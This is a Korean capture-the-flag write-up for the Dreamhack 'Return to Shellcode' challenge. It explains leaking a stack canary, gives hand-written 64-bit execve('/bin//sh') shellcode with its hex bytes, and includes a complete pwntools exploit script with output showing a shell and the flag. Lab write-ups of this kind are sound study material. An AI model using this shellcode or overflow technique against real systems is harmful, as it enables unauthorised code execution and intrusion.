https://honey-push-30b.notion.site/Return-to-Shellcode-99b90064ee524ef3adb6074e39a4da4b

# 문제파일 다운로드

```c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

# Checksec을 통한 보호기법 확인

```c
CANARY    : ENABLED
FORTIFY   : disabled
NX        : disabled
PIE       : ENABLED
RELRO     : FULL
```

카나리가 존재하는 것을 확인할 수 있다.

# pdisas main

```c
	 0x00000000000008cd <+0>:     push   rbp
   0x00000000000008ce <+1>:     mov    rbp,rsp
   0x00000000000008d1 <+4>:     sub    rsp,0x60
   0x00000000000008d5 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x00000000000008de <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000008e2 <+21>:    xor    eax,eax
   0x00000000000008e4 <+23>:    mov    eax,0x0
```

main을 디스어셈블 해보면 스택 프레임 생성 후 (+0~+1) 스택을 0x60만큼 할당해주는 것을 볼 수 있다.

```c
char buf[0x50];
```

C언어로 봤을 때는 0x50만큼 버퍼에 공간을 할당해줘야 하는데 왜 0x60만큼 할당해줬을까?

그 이유는 카나리 때문이다. 카나리 값을 넣어줘야 하기 때문에 C언어로 작성했을 때 버퍼의 공간 보다 더 할당해줘야 하기 때문이다. 그리고 카나리 값은 버퍼오버플로우가 일어나는지 확인하기 위해서 버퍼 바로 뒤에 존재한다.

```c
   0x00000000000008d5 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x00000000000008de <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000008e2 <+21>:    xor    eax,eax
   0x00000000000008e4 <+23>:    mov    eax,0x0
```

카나리 값(fs:0x28)을 rbp-0x8에 넣어주는 모습이다. 그러면 할당된 공간 상태는 다음과 같다.

![상태.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3d103aa8-9d9b-4cef-9e3e-fed548405f57/%EC%83%81%ED%83%9C.png)

따라서 0x58만큼 값을 넣어준 후 한칸만 더 덮어씌우면 카나리 값에 도달을 한다. 카나리 값은 항상 첫 바이트 값이 \x00이다. 그 이유는 앞의 buf의 크기가 만약 10이고 10바이트 만큼 입력을 받을 수 있다고 가정하면 10바이트가 전부 입력될 경우 버퍼의 끝을 의미하는 \x00이 없어 그 뒷부분까지 메모리가 누출될 수 있기 때문이다. 

이 때 코드를 보면

```c
  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);
```

사용자로부터 처음 입력을 받은 후 입력값을 출력해주는데 이 때 카나리 값인 \x00값을 변조해주면 카나리 뒷부분을 알 수 있게 된다. 그 이후 카나리값을 알아내어 그 값으로 카나리 값을 덮어 씌우고 그 뒤의 SFP와 함수 종료 후 실행될 주소를 덮어 씌워주면 된다.

이제 실행될 주소를 찾아야 하는데 flag값을 출력시킬 함수가 C언어 코드 내에 존재하지 않는 것을 볼 수 있다. 이 때 보호 기법을 보면 NX가 설정이 되어 있지 않기 때문에 스택에 실행권한이 존재한다. 따라서 내가 원하는 쉘코드를 buf에 넣어주고 buf의 주소를 가리키게 하여 쉘 코드를 실행시키면 된다.

쉘코드는 execve(”/bin//sh”,null,null)를 작성하기로 했다. 기존에 32비트로 작성한 것과는 다르게 환경이 64비트이므로 64비트 기준으로 작성해야 해서 쉘코드에 변경점이 생겼다.

- 참고한 자료
    
    [https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&blogId=win0k&logNo=221353346378](https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&blogId=win0k&logNo=221353346378) 64비트 쉘코드 작성법
    
    syscall rax값 참고 사이트 [https://syscall.sh/](https://syscall.sh/)
    

```python
section .text
global _start
_start:
	xor rax,rax
	mov rbx, 0x68732f2f6e69622f
	push rbx
	mov rdi,rsp
	xor rsi,rsi ; rdx = NULL
	xor rdx,rdx  ; rdx = NULL
	mov rax, 0x3b
	syscall       ; execve("/bin//sh", null, null)
```

```python
┌──(root💀kali)-[~/바탕화면/return_to_shellcode]
└─# nasm -f elf64 shellcode.asm                                                            1 ⚙
                                                                                               
┌──(root💀kali)-[~/바탕화면/return_to_shellcode]
└─# objcopy --dump-section .text=shellcode.bin shellcode.o                                 1 ⚙
                                                                                               
┌──(root💀kali)-[~/바탕화면/return_to_shellcode]
└─# xxd shellcode.bin                                                                      1 ⚙
00000000: 4831 c048 bb2f 6269 6e2f 2f73 6853 4889  H1.H./bin//shSH.
00000010: e748 31f6 4831 d2b8 3b00 0000 0f05       .H1.H1..;.....
```

이렇게 작성하고 나면 쉘코드에 \x00이 생겨서 \x0f\x05가 들어가기 전에 문자열 입력을 종료 받으므로 다른 방법을 통해 rax에 0x3b를 넣어줘야 한다.

64비트이므로 앞의 8비트에는 3b가 들어있고 나머지 56비트에는 fe값으로 채운뒤 shift right 연산을 통하여 56비트 만큼 이동해주면 rax에는 0x000000000000003b이 저장될 것이다.

```python
section .text
global _start
_start:
	xor rax,rax
	mov rbx, 0x68732f2f6e69622f
	push rbx
	mov rdi,rsp
	xor rsi,rsi ; rdx = NULL
	xor rdx,rdx  ; rdx = NULL
	mov rax, 0x3bfefefefefefefe ;
	shr rax, 0x38
	syscall       ; execve("/bin//sh", null, null)
```

```python
┌──(root💀kali)-[~/바탕화면/return_to_shellcode]
└─# nasm -f elf64 shellcode.asm                                                            1 ⚙
                                                                                               
┌──(root💀kali)-[~/바탕화면/return_to_shellcode]
└─# objcopy --dump-section .text=shellcode.bin shellcode.o                                 1 ⚙
                                                                                               
┌──(root💀kali)-[~/바탕화면/return_to_shellcode]
└─# xxd shellcode.bin                                                                      1 ⚙
00000000: 4831 c048 bb2f 6269 6e2f 2f73 6853 4889  H1.H./bin//shSH.
00000010: e748 31f6 4831 d248 b8fe fefe fefe fefe  .H1.H1.H........
00000020: 3b48 c1e8 380f 05                        ;H..8..
```

즉 쉘코드는 \x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xb8\xfe\xfe\xfe\xfe\xfe\xfe\xfe\x3b\x48\xc1\xe8\x38\x0f\x05 가 된다.

```python
from pwn import *

p = remote('host3.dreamhack.games',13898)
p.recvuntil("Address of the buf: ")
address=int(p.recvline()[:-1],16)
print("addr:",hex(address))

payload=b'A'*0x59
p.send(payload)
p.recvuntil("Your input is ")
p.recvuntil(payload)
canary=u64(b"\x00"+p.recv(7))

print("canary:",hex(canary))

shellcode=b'\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xb8\xfe\xfe\xfe\xfe\xfe\xfe\xfe\x3b\x48\xc1\xe8\x38\x0f\x05'
payload=shellcode+b'A'*(0x58-len(shellcode))

payload+=p64(canary)

payload+=b'B'*0x8 

payload+=p64(address)

p.sendlineafter("Input:",payload)

p.interactive()
```

이 익스 코드를 이제 실행해 주고 나면

```python
┌──(root💀kali)-[~/바탕화면/return_to_shellcode]
└─# python3 ./answer.py                                                                    1 ⚙
[+] Opening connection to host3.dreamhack.games on port 13898: Done
/root/바탕화면/return_to_shellcode/./answer.py:5: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("Address of the buf: ")
addr: 0x7fffcba9b120
/root/바탕화면/return_to_shellcode/./answer.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("Your input is ")
canary: 0x4655079c98c3b600
/usr/local/lib/python3.10/dist-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
 $ ls
flag
r2s
$ cat flag
DH{333eb89c9d2615dd8942ece08c1d34d5}
```

쉘 권한을 정상적으로 얻어서 flag 값을 얻어 내는 것을 성공할 수 있다.
